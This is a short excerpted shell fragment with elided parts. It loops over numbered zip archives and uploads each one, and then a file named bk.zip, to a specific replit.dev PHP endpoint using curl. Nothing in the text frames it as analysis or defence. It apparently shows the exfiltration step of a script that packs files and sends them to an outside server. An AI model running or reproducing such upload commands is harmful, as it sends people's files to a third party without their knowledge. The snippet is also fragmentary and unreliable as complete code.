...
for ((i=1; i<=num_zip_files-1; i++)); do
    ...
    curl -F "file=@${zip_file}" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
...
curl -F "file=@bk.zip" https://ea1aaf85-19d9-4851-b14a-6940daf7001a-00-ri8huy38jyvg.sisko.replit.dev/BE/index.php
